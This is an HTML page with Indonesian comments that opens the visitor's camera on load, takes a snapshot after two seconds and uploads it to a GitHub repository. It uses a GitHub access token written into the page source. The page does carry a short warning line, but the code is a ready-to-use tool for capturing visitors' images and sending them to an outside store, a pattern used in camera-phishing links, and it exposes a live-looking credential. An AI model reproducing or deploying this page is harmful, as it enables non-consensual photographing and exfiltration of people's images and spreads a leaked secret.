<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kamera Web</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        #video, #canvas {
            display: block;
            margin: 10px auto;
        }
        #status {
            color: green;
        }
        #error {
            color: red;
        }
    </style>
</head>
<body>
    <h1>Video dari Kamera</h1>
    <p>Perhatian: Kamera akan mengambil foto saat halaman dibuka.</p>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <p id="status"></p>
    <p id="error"></p>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const status = document.getElementById('status');
        const errorMsg = document.getElementById('error');

        // Fungsi untuk mengunggah file ke GitHub
        async function uploadToGitHub(imageData) {
            const token = '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'; // Token GitHub
            const repoOwner = 'cimol07'; // Ganti dengan username GitHub-mu
            const repoName = 'kamera-webb'; // Ganti dengan nama repositori
            const path = `photos/photo_${Date.now()}.png`; // Nama file di repositori
            const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${path}`;

            // Konversi base64 ke konten yang sesuai untuk GitHub API
            const content = imageData.split(',')[1]; // Hapus prefix base64

            try {
                const response = await fetch(apiUrl, {
                    method: 'PUT',
                    headers: {
                        'Authorization': `token ${token}`,
                        'Content-Type': 'application/json',
                        'Accept': 'application/vnd.github.v3+json'
                    },
                    body: JSON.stringify({
                        message: `Upload photo ${path}`,
                        content: content
                    })
                });

                if (response.ok) {
                    status.textContent = 'Foto berhasil diunggah ke GitHub!';
                } else {
                    const errorData = await response.json();
                    errorMsg.textContent = `Gagal mengunggah: ${errorData.message}`;
                }
            } catch (error) {
                errorMsg.textContent = `Error: ${error.message}`;
            }
        }

        // Meminta akses ke kamera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // Tunggu 2 detik, lalu ambil foto
                setTimeout(() => {
                    // Gambar frame dari video ke canvas
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Konversi canvas ke base64 (format PNG)
                    const imageData = canvas.toDataURL('image/png');

                    // Unggah ke GitHub
                    uploadToGitHub(imageData);

                    // Hentikan stream kamera setelah foto diambil
                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                    video.style.display = 'none';
                }, 2000); // 2 detik delay
            })
            .catch(error => {
                errorMsg.textContent = `Error accessing camera: ${error.message}`;
            });
    </script>
</body>
</html>
